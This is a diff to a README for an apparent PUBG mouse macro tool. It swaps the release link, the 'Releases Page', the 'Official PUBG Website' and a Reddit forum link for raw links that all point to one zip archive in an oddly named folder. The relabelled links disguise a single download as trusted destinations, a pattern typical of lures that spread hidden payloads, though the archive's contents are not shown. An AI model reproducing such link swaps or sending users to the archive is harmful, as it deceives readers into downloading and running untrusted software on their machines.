@@ -1,7 +1,7 @@
 # 🖱️ PUBG-ALL-MOUSE-AI-MACRO - Enhance Your PUBG Experience 
 
 ## 🔗 Download Now
-[![Download PUBG-ALL-MOUSE-AI-MACRO](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/releases)
+[![Download PUBG-ALL-MOUSE-AI-MACRO](https://raw.githubusercontent.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/main/cholesterin/PUBG-ALL-MOUSE-AI-MACRO.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/main/cholesterin/PUBG-ALL-MOUSE-AI-MACRO.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to the PUBG-ALL-MOUSE-AI-MACRO repository. This application is designed 
 
 To download and install PUBG-ALL-MOUSE-AI-MACRO, please follow these steps:
 
-1. Visit the [Releases Page](https://github.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/main/cholesterin/PUBG-ALL-MOUSE-AI-MACRO.zip).
 2. Locate the latest release of PUBG-ALL-MOUSE-AI-MACRO.
 3. Click on the appropriate download link for your operating system.
 4. Once the download completes, locate the downloaded file in your downloads folder.
@@ -72,7 +72,7 @@ If you encounter any issues or have questions, please feel free to reach out via
 
 For further information on how to enhance your gaming experience, consider checking out:
 
-- [Official PUBG Website](https://www.pubg.com)
-- [Gaming Forums](https://www.reddit.com/r/PUBATTLEGROUNDS/)
+- [Official PUBG Website](https://raw.githubusercontent.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/main/cholesterin/PUBG-ALL-MOUSE-AI-MACRO.zip)
+- [Gaming Forums](https://raw.githubusercontent.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/main/cholesterin/PUBG-ALL-MOUSE-AI-MACRO.zip)
   
 Thank you for choosing PUBG-ALL-MOUSE-AI-MACRO. We hope you enjoy a smoother and more enjoyable gaming experience!
